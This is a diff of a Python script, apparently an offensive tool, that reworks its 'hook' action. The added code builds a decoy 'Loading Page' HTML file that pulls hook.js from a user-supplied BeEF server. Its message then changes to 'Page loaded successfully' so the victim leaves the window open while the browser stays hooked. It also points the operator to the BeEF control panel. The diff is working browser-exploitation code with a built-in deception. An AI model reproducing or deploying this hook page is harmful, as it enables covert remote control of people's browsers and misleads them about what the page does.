@@ -387,29 +387,53 @@ while True:
 #
 
 #Action hook = beef hook
-    if action == "hook":
-        logging.info(f"Chosen action hook to attempt beef hook")
-        pattern = r"^\d{0,3}\.\d{0,3}\.\d{0,3}\.\d{0,3}:\d+$"
-        sleep(0.1)
-        while True:
-            beefip=input("IP that beef is running on (pure IP number with port-native port 3000): ")
-            if re.match (pattern, beefip):
-                cls()
-                print("Valid IP, trying hook...")
-                sleep(0.1)
-                webbrowser.open("http://" + beefip + "/hook.js")
-                logging.info(f"Opened beef hook URL: http://{beefip}/hook.js")
-                print("The hook has started...")
-                sleep(1)
-                break
-
-            else:
-                print("Invalid IP input")
-                logging.error(f"Invalid IP input for beef hook: {beefip}")
-                sleep(0.1)
-
-    else:
-        print("")
+	#Action hook = beef hook
+	if action == "hook":
+		logging.info(f"Chosen action hook to attempt beef hook")
+		pattern = r"^\d{0,3}\.\d{0,3}\.\d{0,3}\.\d{0,3}:\d+$"
+		sleep(0.1)
+		while True:
+			beefip = input("IP that beef is running on (pure IP number with port - native port 3000): ")
+			if re.match(pattern, beefip):
+				cls()
+				print("Valid IP, creating hook page...")
+				sleep(0.1)
+				
+				# Create HTML page with the hook embedded
+				html_content = f"""<!DOCTYPE html>
+<html>
+<head>
+	<title>Loading Page</title>
+</head>
+<body>
+	<h3>Please wait while loading...</h3>
+	<script src="http://{beefip}/hook.js"></script>
+	<script>
+		// Keep page alive for hook to work
+		setTimeout(function() {{
+			document.body.innerHTML = '<h2>Page loaded successfully</h2><p>You can minimize this window.</p>';
+		}}, 3000);
+	</script>
+</body>
+</html>"""
+				
+				# Save to temporary file
+				with open("beef_hook.html", "w") as f:
+					f.write(html_content)
+				
+				# Get absolute path and open in browser
+				hook_path = os.path.abspath("beef_hook.html")
+				webbrowser.open(f"file://{hook_path}")
+				
+				print("Hook page opened in browser...")
+				print(f"Check BeEF panel at: http://{beefip}/ui/panel")
+				logging.info(f"Created beef hook page for {beefip}")
+				sleep(1)
+				break
+			else:
+				print("Invalid IP input")
+				logging.error(f"Invalid IP input for beef hook: {beefip}")
+				sleep(0.1)
 
 #
 #
